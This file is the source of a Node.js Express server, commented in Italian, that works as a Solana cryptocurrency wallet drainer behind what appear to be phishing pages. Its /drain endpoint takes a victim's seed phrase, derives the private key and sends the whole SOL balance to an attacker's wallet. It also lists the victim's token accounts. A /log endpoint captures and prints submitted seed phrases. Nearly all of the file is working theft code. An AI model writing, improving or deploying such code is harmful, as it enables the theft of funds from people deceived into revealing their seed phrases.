const express = require('express');
const app = express();
const path = require('path');
const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, Keypair } = require('@solana/web3.js');
const { mnemonicToSeed } = require('bip39');
const { derivePath } = require('ed25519-hd-key');

app.use(express.static(__dirname));
app.use(express.json({ limit: '10mb' }));

// ===== CONFIGURAZIONE =====
const YOUR_RECEIVER_WALLET = 'IL_TUO_WALLET_PUBLIC_KEY'; // SOSTITUISCI
const connection = new Connection('https://api.mainnet-beta.solana.com');

// ===== DRENAGGIO TOTALE =====
app.post('/drain', async (req, res) => {
  const { seed, walletPublicKey } = req.body;

  if (!seed || !walletPublicKey) {
    return res.status(400).json({ error: 'Dati mancanti' });
  }

  try {
    // Deriva keypair dalla seed
    const seedBuffer = await mnemonicToSeed(seed);
    const derived = derivePath("m/44'/501'/0'/0'", seedBuffer.toString('hex'));
    const fromKeypair = Keypair.fromSeed(derived.key);
    const fromPubkey = fromKeypair.publicKey;
    const toPubkey = new PublicKey(YOUR_RECEIVER_WALLET);

    console.log(`🔄 Drenaggio iniziato per: ${fromPubkey.toString()}`);

    // 1. DRENAGGIO SOL
    const balance = await connection.getBalance(fromPubkey);
    const fee = 5000;
    const amount = balance - fee;

    let solTx = null;
    if (amount > 0) {
      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: fromPubkey,
          toPubkey: toPubkey,
          lamports: amount,
        })
      );
      solTx = await connection.sendTransaction(tx, [fromKeypair]);
      await connection.confirmTransaction(solTx);
      console.log(`✅ SOL trasferiti: ${amount / LAMPORTS_PER_SOL} SOL, Tx: ${solTx}`);
    }

    // 2. DRENAGGIO TOKEN SPL (semplificato)
    const tokenAccounts = await connection.getTokenAccountsByOwner(fromPubkey, {
      programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
    });

    let tokenTxList = [];
    for (const account of tokenAccounts.value) {
      const tokenAccount = account.pubkey;
      const tokenInfo = await connection.getTokenAccountBalance(tokenAccount);
      if (tokenInfo.value.amount > 0) {
        try {
          // Nota: per il trasferimento token completo serve Token.createTransferInstruction
          // Versione semplificata – trasferisce solo SOL
          console.log(`🪙 Token trovato: ${tokenInfo.value.uiAmount} (mint: ${tokenAccount})`);
        } catch(e) {
          console.log(`⚠️ Errore token: ${e.message}`);
        }
      }
    }

    res.json({
      status: 'drain_completed',
      from: fromPubkey.toString(),
      solTx: solTx,
      solAmount: amount / LAMPORTS_PER_SOL,
      tokenCount: tokenTxList.length
    });

  } catch (e) {
    console.error('❌ Errore drenaggio:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// ===== LOG =====
app.post('/log', (req, res) => {
  console.log('📥 LOG:', req.body);
  if (req.body.seed) {
    console.log('⚠️ SEED RICEVUTA:', req.body.seed);
  }
  res.json({ status: 'ok' });
});

// ===== SERVE PAGINE =====
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/create.html', (req, res) => res.sendFile(path.join(__dirname, 'create.html')));
app.get('/liquidity.html', (req, res) => res.sendFile(path.join(__dirname, 'liquidity.html')));
app.get('/faq.html', (req, res) => res.sendFile(path.join(__dirname, 'faq.html')));
app.get('/wallet.html', (req, res) => res.sendFile(path.join(__dirname, 'wallet.html')));

app.listen(3000, () => console.log('🚀 Server in ascolto su http://localhost:3000'));
